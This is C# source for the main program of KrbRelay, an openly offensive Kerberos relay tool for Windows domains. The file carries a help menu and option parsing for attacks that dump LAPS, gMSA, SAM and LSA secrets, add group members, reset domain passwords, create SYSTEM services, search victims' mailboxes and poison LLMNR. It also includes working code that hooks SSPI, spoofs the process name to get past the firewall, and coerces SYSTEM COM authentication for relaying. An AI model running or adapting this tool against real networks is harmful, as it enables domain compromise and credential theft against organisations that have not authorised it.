using KrbRelay.Com;
using SMBLibrary;
using SMBLibrary.Client;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace KrbRelay
{
    internal class Program
    {
        public static SMB2Client smbClient = new SMB2Client();
        public static HttpClientHandler handler = new HttpClientHandler();
        public static HttpClient httpClient = new HttpClient();
        public static CookieContainer CookieContainer = new CookieContainer();

        private static void ShowHelp()
        {
            Console.WriteLine();
            Console.WriteLine("KrbRelay by @Cube0x0");
            Console.WriteLine("The Relaying Kerberos Framework");
            Console.WriteLine();

            Console.WriteLine("Usage: KrbRelay.exe -spn <SPN> [OPTIONS] [ATTACK]");
            Console.WriteLine("LDAP attacks:");
            Console.WriteLine("-console                         Interactive LDAP console");
            Console.WriteLine(
                "-rbcd <SID> <OPTIONAL TARGET>    Configure RBCD for a given SID (default target localhost)"
            );
            Console.WriteLine(
                "-shadowcred <OPTIONAL TARGET>    Configure msDS-KeyCredentialLink (default target localhost)"
            );
            Console.WriteLine("-laps <OPTIONAL TARGET>          Dump LAPS passwords");
            Console.WriteLine("-gMSA <OPTIONAL TARGET>          Dump gMSA passwords");
            Console.WriteLine("-add-groupmember <GROUP> <USER>  Add user to group");
            Console.WriteLine("-reset-password  <USER> <PASS>   Reset domain user password");
            Console.WriteLine();

            Console.WriteLine("SMB attacks:");
            Console.WriteLine("-console                         Interactive SMB console");
            Console.WriteLine("-list                            List SMB shares");
            Console.WriteLine("-add-privileges <SID>            Add privileges for a given SID");
            Console.WriteLine("-secrets                         Dump SAM & LSA secrets");
            Console.WriteLine("-service-add <NAME> <COMMAND>    Create SYSTEM service");
            //Console.WriteLine("-set-secquestions                Reset security questions");
            //Console.WriteLine("-reset-password  <USER> <PASS>   Reset local user password");
            //Console.WriteLine("printdriver-add <DLL>           Add printer driver");
            //Console.WriteLine("-reg-query                     Query registry key");
            //Console.WriteLine("-upload   <Path>                 Upload file via SMB");
            //Console.WriteLine("-download <Path>                 Download file via SMB");
            Console.WriteLine();

            Console.WriteLine("HTTP attacks:");
            Console.WriteLine("-endpoint <ENDPOINT>             Example; 'EWS/Exchange.asmx'");
            Console.WriteLine(
                "-proxy                           Start a HTTP proxy server against target"
            );
            //Console.WriteLine("-adcs <TEMPLATE>                 Generate certificate");
            //Console.WriteLine("-ews-console                   EWS console");
            Console.WriteLine("-ews-delegate <USER@DOMAIN>      EWS delegate mailbox");
            //Console.WriteLine("-ews-read   <LIMIT>              Read victims inbox");
            Console.WriteLine("-ews-search <KEYWORD,KEYWORD2>   Search inbox for keywords");
            Console.WriteLine();

            Console.WriteLine("Options:");
            Console.WriteLine("-ssl                      Use SSL transport");
            Console.WriteLine("-spn                      ServicePrincipalName for target service");
            Console.WriteLine("-clsid                    Service to be executed in");
            Console.WriteLine("-session                  ID for cross-session marshalling");
            Console.WriteLine("-port                     COM listener port");
            Console.WriteLine("-llmnr                    LLMNR poisoning");
        }

        public static void Main(string[] args)
        {
            string clsid = "";
            string service = "";
            string domain = "";
            int sessionID = -123;
            string port = "12345";
            bool show_help = false;
            bool llmnr = false;
            Guid clsId_guid = new Guid();

            foreach (var entry in args.Select((value, index) => new { index, value }))
            {
                string argument = entry.value.ToUpper();

                switch (argument)
                {
                    //
                    case "-CONSOLE":
                    case "/CONSOLE":
                        throw new ArgumentException(
                            "Likely shouldn't use console mode in library form"
                        );
                    // ldap attacks
                    case "-RBCD":
                    case "/RBCD":
                        try
                        {
                            if (
                                args[entry.index + 2].StartsWith("/")
                                || args[entry.index + 2].StartsWith("-")
                            )
                                throw new Exception();
                            State.attacks.Add(
                                "rbcd",
                                args[entry.index + 1] + " " + args[entry.index + 2]
                            );
                        }
                        catch
                        {
                            try
                            {
                                if (
                                    args[entry.index + 1].StartsWith("/")
                                    || args[entry.index + 1].StartsWith("-")
                                )
                                    throw new Exception();
                                State.attacks.Add("rbcd", args[entry.index + 1] + " " + "");
                            }
                            catch
                            {
                                Console.WriteLine("[-] -rbcd requires an argument");
                                return;
                            }
                        }
                        break;

                    case "-SHADOWCRED":
                    case "/SHADOWCRED":
                        try
                        {
                            if (
                                args[entry.index + 1].StartsWith("/")
                                || args[entry.index + 1].StartsWith("-")
                            )
                                throw new Exception();
                            State.attacks.Add("shadowcred", args[entry.index + 1]);
                        }
                        catch
                        {
                            State.attacks.Add("shadowcred", "");
                        }
                        break;

                    case "-LAPS":
                    case "/LAPS":
                        try
                        {
                            if (
                                args[entry.index + 1].StartsWith("/")
                                || args[entry.index + 1].StartsWith("-")
                            )
                                throw new Exception();
                            State.attacks.Add("laps", args[entry.index + 1]);
                        }
                        catch
                        {
                            State.attacks.Add("laps", "");
                        }
                        break;

                    case "-GMSA":
                    case "/GMSA":
                        try
                        {
                            if (
                                args[entry.index + 1].StartsWith("/")
                                || args[entry.index + 1].StartsWith("-")
                            )
                                throw new Exception();
                            State.attacks.Add("gmsa", args[entry.index + 1]);
                        }
                        catch
                        {
                            State.attacks.Add("gmsa", "");
                        }
                        break;

                    case "-ADD-GROUPMEMBER":
                    case "/ADD-GROUPMEMBER":
                        try
                        {
                            if (
                                args[entry.index + 1].StartsWith("/")
                                || args[entry.index + 1].StartsWith("-")
                            )
                                throw new Exception();
                            if (
                                args[entry.index + 2].StartsWith("/")
                                || args[entry.index + 2].StartsWith("-")
                            )
                                throw new Exception();
                            State.attacks.Add(
                                "add-groupmember",
                                args[entry.index + 1] + " " + args[entry.index + 2]
                            );
                        }
                        catch
                        {
                            Console.WriteLine("[-] -add-groupmember requires two arguments");
                            return;
                        }
                        break;

                    case "-RESET-PASSWORD":
                    case "/RESET-PASSWORD":
                        try
                        {
                            if (
                                args[entry.index + 2].StartsWith("/")
                                || args[entry.index + 2].StartsWith("-")
                            )
                                throw new Exception();
                            State.attacks.Add(
                                "reset-password",
                                args[entry.index + 1] + " " + args[entry.index + 2]
                            );
                        }
                        catch
                        {
                            Console.WriteLine("[-] -reset-password requires two arguments");
                            return;
                        }
                        break;

                    // smb attacks
                    case "-LIST":
                    case "/LIST":
                        try
                        {
                            if (
                                args[entry.index + 1].StartsWith("/")
                                || args[entry.index + 1].StartsWith("-")
                            )
                                throw new Exception();
                            State.attacks.Add("list", args[entry.index + 1]);
                        }
                        catch
                        {
                            State.attacks.Add("list", "");
                        }
                        break;

                    case "-UPLOAD":
                    case "/UPLOAD":
                        try
                        {
                            if (
                                args[entry.index + 1].StartsWith("/")
                                || args[entry.index + 1].StartsWith("-")
                            )
                                throw new Exception();
                            State.attacks.Add("upload", args[entry.index + 1]);
                        }
                        catch
                        {
                            Console.WriteLine("[-] -upload requires an argument");
                            return;
                        }
                        break;

                    case "-DOWNLOAD":
                    case "/DOWNLOAD":
                        try
                        {
                            if (
                                args[entry.index + 1].StartsWith("/")
                                || args[entry.index + 1].StartsWith("-")
                            )
                                throw new Exception();
                            State.attacks.Add("download", args[entry.index + 1]);
                        }
                        catch
                        {
                            Console.WriteLine("[-] -download requires an argument");
                            return;
                        }
                        break;

                    case "-SECRETS":
                    case "/SECRETS":
                        try
                        {
                            if (
                                args[entry.index + 1].StartsWith("/")
                                || args[entry.index + 1].StartsWith("-")
                            )
                                throw new Exception();
                            State.attacks.Add("secrets", args[entry.index + 1]);
                        }
                        catch
                        {
                            State.attacks.Add("secrets", "");
                        }
                        break;

                    case "-ADD-PRIVILEGES":
                    case "/ADD-PRIVILEGES":
                        try
                        {
                            State.attacks.Add("add-privileges", args[entry.index + 1]);
                        }
                        catch
                        {
                            Console.WriteLine("[-] -add-privileges requires an argument");
                            return;
                        }
                        break;

                    case "-SERVICE-ADD":
                    case "/SERVICE-ADD":
                        try
                        {
                            if (
                                args[entry.index + 1].StartsWith("/")
                                || args[entry.index + 1].StartsWith("-")
                            )
                                throw new Exception();
                            if (
                                args[entry.index + 2].StartsWith("/")
                                || args[entry.index + 2].StartsWith("-")
                            )
                                throw new Exception();
                            State.attacks.Add(
                                "service-add",
                                args[entry.index + 1] + " " + args[entry.index + 2]
                            );
                        }
                        catch
                        {
                            Console.WriteLine("[-] -service-add requires two arguments");
                            return;
                        }
                        break;

                    case "-ADD-PRINTERDRIVER":
                    case "/ADD-PRINTERDRIVER":
                        try
                        {
                            State.attacks.Add("add-priverdriver", args[entry.index + 1]);
                        }
                        catch
                        {
                            Console.WriteLine("[-] -add-priverdriver requires an argument");
                            return;
                        }
                        break;

                    // http attacks
                    case "-ENDPOINT":
                    case "/ENDPOINT":
                        try
                        {
                            if (
                                args[entry.index + 1].StartsWith("/")
                                || args[entry.index + 1].StartsWith("-")
                            )
                                throw new Exception();
                            State.attacks.Add("endpoint", args[entry.index + 1]);
                        }
                        catch
                        {
                            Console.WriteLine("[-] -endpoint requires an argument");
                            return;
                        }
                        break;

                    case "-ADCS":
                    case "/ADCS":
                        try
                        {
                            if (
                                args[entry.index + 1].StartsWith("/")
                                || args[entry.index + 1].StartsWith("-")
                            )
                                throw new Exception();
                            State.attacks.Add("adcs", args[entry.index + 1]);
                        }
                        catch
                        {
                            Console.WriteLine("[-] -adcs requires an argument");
                            return;
                        }
                        break;

                    case "-PROXY":
                    case "/PROXY":
                        try
                        {
                            if (
                                args[entry.index + 1].StartsWith("/")
                                || args[entry.index + 1].StartsWith("-")
                            )
                                throw new Exception();
                            State.attacks.Add("proxy", args[entry.index + 1]);
                        }
                        catch
                        {
                            State.attacks.Add("proxy", "");
                        }
                        break;

                    case "-EWS-CONSOLE":
                    case "/EWS-CONSOLE":
                        try
                        {
                            if (
                                args[entry.index + 1].StartsWith("/")
                                || args[entry.index + 1].StartsWith("-")
                            )
                                throw new Exception();
                            State.attacks.Add("ews-console", args[entry.index + 1]);
                        }
                        catch
                        {
                            State.attacks.Add("ews-console", "");
                        }
                        break;

                    case "-EWS-DELEGATE":
                    case "/EWS-DELEGATE":
                        try
                        {
                            if (
                                args[entry.index + 1].StartsWith("/")
                                || args[entry.index + 1].StartsWith("-")
                            )
                                throw new Exception();
                            State.attacks.Add("ews-delegate", args[entry.index + 1]);
                        }
                        catch
                        {
                            Console.WriteLine("[-] -ews-delegate requires an argument");
                            return;
                        }
                        break;

                    case "-EWS-SEARCH":
                    case "/EWS-SEARCH":
                        try
                        {
                            if (
                                args[entry.index + 1].StartsWith("/")
                                || args[entry.index + 1].StartsWith("-")
                            )
                                throw new Exception();
                            State.attacks.Add("ews-search", args[entry.index + 1]);
                        }
                        catch
                        {
                            Console.WriteLine("[-] -ews-search requires an argument");
                            return;
                        }
                        break;

                    //optional
                    case "-H":
                    case "/H":
                        show_help = true;
                        break;

                    case "-SSL":
                    case "/SSL":
                        State.useSSL = true;
                        break;
                    case "-LLMNR":
                    case "/LLMNR":
                        llmnr = true;
                        break;

                    case "-PORT":
                    case "/PORT":
                        port = args[entry.index + 1];
                        break;

                    case "-SPN":
                    case "/SPN":
                        State.spn = args[entry.index + 1];
                        break;

                    case "-CLSID":
                    case "/CLSID":
                        clsid = args[entry.index + 1];
                        break;

                    case "-SESSION":
                    case "/SESSION":
                        sessionID = Int32.Parse(args[entry.index + 1]);
                        break;
                }
            }

            if (show_help)
            {
                ShowHelp();
                return;
            }

            if (string.IsNullOrEmpty(State.spn))
            {
                Console.WriteLine("Missing /spn: parameter");
                Console.WriteLine("KrbRelay.exe -h for help");
                return;
            }

            if (string.IsNullOrEmpty(domain))
            {
                string[] d = State.spn.Split('.').Skip(1).ToArray();
                domain = string.Join(".", d);
            }
            if (string.IsNullOrEmpty(State.targetFQDN))
            {
                string[] d = State.spn.Split('/').Skip(1).ToArray();
                State.targetFQDN = string.Join(".", d);
            }
            var domainComponent = domain.Split('.');
            foreach (string dc in domainComponent)
            {
                State.domainDN += string.Concat(",DC=", dc);
            }
            State.domainDN = State.domainDN.TrimStart(',');

            Helpers.LoadLDAPLibrary();

            service = State.spn.Split('/').First().ToLower();
            if (!(new List<string> { "ldap", "cifs", "http" }.Contains(service)))
            {
                Console.WriteLine("'{0}' service not supported", service);
                Console.WriteLine("choose from CIFS, LDAP and HTTP");
                return;
            }

            if (string.IsNullOrEmpty(clsid) && llmnr == false)
            {
#if DEBUG
                // Hard overrides for testing
                if (sessionID != -123)
                {
                    // cross-session
                    //clsid = "{354ff91b-5e49-4bdc-a8e6-1cb6c6877182}";
                    //clsid = "{38e441fb-3d16-422f-8750-b2dacec5cefc}";
                    clsid = "{f8842f8e-dafe-4b37-9d38-4e0714a61149}";
                }
                else
                {
                    //system
                    clsid = "{90F18417-F0F1-484E-9D3C-59DCEEE5DBD8}";
                }

                Console.WriteLine("[*] Manually set CLSID for debug mode");
#else
                Console.WriteLine("Missing /clsid: parameter");
                Console.WriteLine("KrbRelay.exe -h for help");
                return;
#endif
            }
            if (!string.IsNullOrEmpty(clsid))
                clsId_guid = new Guid(clsid);

            Helpers.GetWtsSessionData(sessionID);

            if (service == "ldap")
            {
                var expiration = new LARGE_INTEGER();
                var status = Interop.AcquireCredentialsHandle(
                    null,
                    "Negotiate",
                    2,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    ref State.ldap_CredHandle,
                    ref expiration
                );

#if DEBUG
                Console.WriteLine("[*] AcquireCredentialsHandle: {0}", status);
#endif

                var timeout = new LDAP_TIMEVAL
                {
                    tv_sec = (int)(new TimeSpan(0, 0, 60).Ticks / TimeSpan.TicksPerSecond)
                };
                if (State.useSSL)
                {
                    State.ld = Interop.ldap_init(State.targetFQDN, 636);
                }
                else
                {
                    State.ld = Interop.ldap_init(State.targetFQDN, 389);
                }

                uint LDAP_OPT_ON = 1;
                uint LDAP_OPT_OFF = 1;
                uint version = 3;
                var ldapStatus = Interop.ldap_set_option(State.ld, 0x11, ref version);

                if (State.useSSL)
                {
                    Interop.ldap_get_option(State.ld, 0x0a, out int lv); //LDAP_OPT_SSL
                    if (lv == 0)
                        Interop.ldap_set_option(State.ld, 0x0a, ref LDAP_OPT_ON);

                    Interop.ldap_get_option(State.ld, 0x0095, out lv); //LDAP_OPT_SIGN
                    if (lv == 0)
                        Interop.ldap_set_option(State.ld, 0x0095, ref LDAP_OPT_ON);

                    Interop.ldap_get_option(State.ld, 0x0096, out lv); //LDAP_OPT_ENCRYPT
                    if (lv == 0)
                        Interop.ldap_set_option(State.ld, 0x0096, ref LDAP_OPT_ON);

                    Helpers.TrustAllCertificates(ld);
                }

                ldapStatus = Interop.ldap_connect(State.ld, timeout);
                if (ldapStatus != 0)
                {
                    Console.WriteLine("[-] Could not connect to {0}, ldap_connect failed with error code 0x{1:X2}", State.targetFQDN, ldapStatus);
                    return;
                }
            }
            if (service == "cifs")
            {
                bool isConnected = smbClient.Connect(
                    State.targetFQDN,
                    SMBTransportType.DirectTCPTransport
                );
                if (!isConnected)
                {
                    Console.WriteLine("[-] Could not connect to {0}:445", State.targetFQDN);
                    return;
                }
            }
            if (service == "http")
            {
                if (
                    !State.attacks.Keys.Contains("endpoint")
                    || string.IsNullOrEmpty(State.attacks["endpoint"])
                )
                {
                    Console.WriteLine("[-] -endpoint parameter is required for HTTP");
                    return;
                }

                ServicePointManager.ServerCertificateValidationCallback += (
                    sender,
                    certificate,
                    chain,
                    sslPolicyErrors
                ) => true;
                handler = new HttpClientHandler()
                {
                    UseDefaultCredentials = false,
                    PreAuthenticate = false,
                    UseCookies = true
                };
                httpClient = new HttpClient(handler) { Timeout = new TimeSpan(0, 0, 10) };
                string transport = "http";
                if (State.useSSL)
                {
                    transport = "https";
                }
                httpClient.BaseAddress = new Uri(
                    string.Format("{0}://{1}", transport, State.targetFQDN)
                );

#if DEBUG
                Console.WriteLine("[*] HTTP base address: {0}", httpClient.BaseAddress);
#endif
            }

            if (llmnr)
            {
                if (service == "ldap")
                {
                    Console.WriteLine("[-] LLMNR will not work with ldap");
                    return;
                }

                string argLLMNRTTL = "30";
                string argSpooferIP = "";
                string argSpooferIPv6 = "";

                if (!String.IsNullOrEmpty(argSpooferIP))
                {
                    try
                    {
                        IPAddress.Parse(argSpooferIP);
                    }
                    catch
                    {
                        throw new ArgumentException("SpooferIP value must be an IP address");
                    }
                }
                if (!String.IsNullOrEmpty(argSpooferIPv6))
                {
                    try
                    {
                        IPAddress.Parse(argSpooferIPv6);
                    }
                    catch
                    {
                        throw new ArgumentException("SpooferIP value must be an IP address");
                    }
                }
                if (string.IsNullOrEmpty(argSpooferIP))
                {
                    argSpooferIP = Spoofing.Util.GetLocalIPAddress("IPv4");
                }
                if (string.IsNullOrEmpty(argSpooferIPv6))
                {
                    argSpooferIPv6 = Spoofing.Util.GetLocalIPAddress("IPv6");
                }
                string spoofSPN = "";
                //if (service == "cifs")
                //    spoofSPN = targetFQDN.Split('.')[0];
                //else
                //    spoofSPN = targetFQDN;
                spoofSPN = State.targetFQDN.Split('.')[0];

                Thread llmnrListenerThread = new Thread(
                    () =>
                        Spoofing.LLMNR.LLMNRListener(
                            argSpooferIP,
                            argSpooferIP,
                            argSpooferIPv6,
                            argLLMNRTTL,
                            "IPv4",
                            spoofSPN
                        )
                );
                llmnrListenerThread.Start();

                Spoofing.HttpRelayServer.start(service, argSpooferIP);

                return;
            }

            // Hook SSPI Functions

            SSPIHooks sspiHooks = new SSPIHooks();
            sspiHooks.Hook();

            // Prepare PEB->imagePathName (firewall bypass) and initialize COM/RPC

            string original = Helpers.SetProcessModuleName("System");

            var svcs = new SOLE_AUTHENTICATION_SERVICE[]
            {
                new SOLE_AUTHENTICATION_SERVICE()
                {
                    dwAuthnSvc = 16, // HKLM\SOFTWARE\Microsoft\Rpc\SecurityService sspicli.dll
                    pPrincipalName = State.spn
                }
            };

            int result;

            try
            {
                result = Interop.CoInitializeSecurity(
                    IntPtr.Zero,
                    svcs.Length,
                    svcs,
                    IntPtr.Zero,
                    AuthnLevel.Default,
                    ImpLevel.Impersonate,
                    IntPtr.Zero,
                    AuthenticationCapabilities.DynamicCloaking,
                    IntPtr.Zero
                );
                Console.WriteLine("[*] CoInitializeSecurity: 0x{0:X8}", result);
            }
            finally
            {
                Helpers.SetProcessModuleName(original);
            }

            // Unable to call other com objects before doing the CoInitializeSecurity step
            // Make sure that we'll use an available port

            if (!Helpers.CheckFirewallPort(int.Parse(port)))
            {
                Console.WriteLine("[*] Looking for available ports..");
                port = Helpers.CheckAllFirewallPorts(new string[] { "SYSTEM" }).ToString();
                if (port == "-1")
                {
                    Console.WriteLine("[-] No available ports found");
                    Console.WriteLine("[-] Firwall will block our COM connection. Exiting");
                    return;
                }
                Console.WriteLine("[*] Port {0} available", port);
            }

            // Prepare our object and objref

            Console.WriteLine("[*] Register COM server @ 127.0.0.1:{0}", port);
            byte[] ba = ComUtils.GetMarshalledObject(new object());
            COMObjRefStandard std = (COMObjRefStandard)COMObjRefStandard.FromArray(ba);
            std.StringBindings.Clear();
            std.StringBindings.Add(new COMStringBinding(RpcTowerId.Tcp, "127.0.0.1"));
            Console.WriteLine("[*] ObjRef: {0}", std.ToMoniker());

            //std.SecurityBindings.Clear();
            //std.SecurityBindings.Add(new COMSecurityBinding(RpcAuthnService.GSS_Kerberos, spn));

            Interop.RpcServerUseProtseqEp("ncacn_ip_tcp", 20, port, IntPtr.Zero);
            Interop.RpcServerRegisterAuthInfo(null, 16, IntPtr.Zero, IntPtr.Zero);

            // Initialize IStorage

            result = Ole32.CreateILockBytesOnHGlobal(IntPtr.Zero, true, out ILockBytes lockBytes);
            result = Ole32.StgCreateDocfileOnILockBytes(
                lockBytes,
                Ole32.STGM.CREATE | Ole32.STGM.READWRITE | Ole32.STGM.SHARE_EXCLUSIVE,
                0,
                out IStorage storage
            );
            Ole32.MULTI_QI[] qis = new Ole32.MULTI_QI[1];

            // Insert our ObjRef(std) in the StorageTrigger

            StorageTrigger storageTrigger = new StorageTrigger(
                storage,
                "127.0.0.1",
                TowerProtocol.EPM_PROTOCOL_TCP,
                std
            );
            qis[0].pIID = Ole32.IID_IUnknownPtr;
            qis[0].pItf = null;
            qis[0].hr = 0;

            Console.WriteLine();

            if (sessionID == -123)
            {
                Console.WriteLine("[*] Forcing SYSTEM authentication");
                Console.WriteLine("[*] Using CLSID: {0}", clsId_guid);
                try
                {
                    result = Ole32.CoGetInstanceFromIStorage(
                        null,
                        ref clsId_guid,
                        null,
                        Ole32.CLSCTX.CLSCTX_LOCAL_SERVER,
                        storageTrigger,
                        1,
                        qis
                    );
                }
                catch (Exception e)
                {
                    Console.WriteLine("[*] CoGetInstanceFromIStorage error (this is probably expected):\n");
                    Console.WriteLine(e);
                }
            }
            else
            {
                Console.WriteLine("[*] Forcing cross-session authentication");
                Console.WriteLine("[*] Using CLSID: {0}", clsId_guid);

                Guid tmp = new Guid("{00000000-0000-0000-C000-000000000046}");
                Guid CLSID_ComActivator = new Guid("{0000033C-0000-0000-c000-000000000046}");
                Guid IID_IStandardActivator = typeof(IStandardActivator).GUID;
                var pComAct = (IStandardActivator)new StandardActivator();
                uint result2 = Ole32.CoCreateInstance(
                    ref CLSID_ComActivator,
                    null,
                    0x1,
                    ref IID_IStandardActivator,
                    out object instance
                );
                pComAct = (IStandardActivator)instance;

                if (sessionID != -123)
                {
                    ISpecialSystemPropertiesActivator props =
                        (ISpecialSystemPropertiesActivator)pComAct;
                    Console.WriteLine("[*] Spawning in session {0}", sessionID);
                    props.SetSessionId(sessionID, 0, 1);
                }
                try
                {
                    result = pComAct.StandardGetInstanceFromIStorage(
                        null,
                        clsId_guid,
                        IntPtr.Zero,
                        CLSCTX.LOCAL_SERVER,
                        storageTrigger,
                        1,
                        qis
                    );
                }
                catch (Exception e)
                {
                    Console.WriteLine("[*] StandardGetInstanceFromIStorage error (this is probably expected):\n");
                    Console.WriteLine(e);
                }
            }

            //Marshal.BindToMoniker(std.ToMoniker());

            return;
        }
    }
}
